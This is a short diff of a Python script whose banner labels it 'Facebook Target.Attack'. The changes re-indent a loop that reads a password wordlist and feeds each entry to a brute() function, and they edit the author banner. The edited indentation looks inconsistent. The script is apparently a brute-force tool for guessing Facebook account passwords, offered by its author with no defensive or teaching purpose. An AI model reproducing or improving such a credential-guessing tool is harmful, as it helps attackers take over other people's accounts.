@@ -52,11 +52,11 @@ def brute(password):
 			sys.exit(1)
 			
 		def search():
-	global password
-	passwords = open(passwordlist,"r")
-	for password in passwords:
-		password = password.replace("\n","")
-		brute(password)
+	             global password
+	             passwords = open(passwordlist,"r")
+	             for password in passwords:
+		     password = password.replace("\n","")
+		     brute(password)
 
 		
 #welcome 
@@ -66,7 +66,7 @@ def welcome():
         |..........   Facebook Target.Attack   ...........|
              +-----------------------------------------+
         |            #Author: khalilurahmanhussaini            | 
-        |	      #telegram channel:        |
+        |	      telegram channel:        |
  	|  .............. khalilhacker.........            |
              +=========================================+
         |..........  Facebook Target.Attack  ...........|
